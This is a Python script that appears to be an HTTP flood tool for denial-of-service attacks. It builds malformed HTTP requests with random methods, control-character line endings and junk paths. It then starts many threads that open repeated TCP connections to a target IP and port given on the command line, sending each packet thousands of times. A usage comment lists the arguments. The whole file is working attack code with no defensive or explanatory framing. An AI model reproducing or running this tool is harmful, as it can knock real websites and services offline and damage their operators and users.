import socket,threading,random,string,sys

def http_craft(host='0.0.0.0', header=None):
    end = ''.join(random.choices(['\a', '\b', '\f', '\n', '\r', '\t', '\v'], k=random.randint(1, 3)))
    ending = end * random.randint(1, 3)
    future = random.choice((['0.9','1.0','1.1']))
    packet = [f'{random.choice(['GET', 'POST', 'HEAD', 'DELETE', 'OPTIONS', 'PATCH', 'PUT','TRACE'])} /%s HTTP/{future}{end}Host: {host}{end}']
    if header:
        header_lines = [f'{h}{ending}' if i == len(header) - 1 else f'{h}{end}' for i, h in enumerate(header)]
        packet.extend(header_lines)
    else:
        packet.append(ending)
    return ''.join(packet)

def http_flood(ip,port,method,count,code=1):
    pkt = []
    path_template = [random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(5)]
    for _ in range(5):
     if code == 1:
      packet = ((http_craft(host=ip) * 5)%tuple(path_template)).encode()
     else:
      packet = ((f'{method} /%s HTTP/1.1\nHost: {ip}\n\n\r\r' * 5)%tuple(path_template)).encode()
     pkt.append(packet)
    pack = 0
    for _ in range(count):
        packet = pkt[pack]
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.setblocking(1)
        try:
            s.connect((ip,port)); s.connect_ex((ip,port))
            for _ in range(2500):
                s.send(packet)
                s.sendall(packet)
        except:
           pass
        if pack != 4:
            pack += 1
        elif pack == 4:
            pack = 0

ip = sys.argv[1]
port = int(sys.argv[2])
for _ in range(int(sys.argv[3])*5):
  threading.Thread(target=http_flood,args=(ip,port,sys.argv[5],int(sys.argv[4]))).start() # <IP> <PORT> <THREAD> <TIME> <METHOD_HTTP>
  threading.Thread(target=http_flood,args=(ip,port,sys.argv[5],int(sys.argv[4]),2)).start()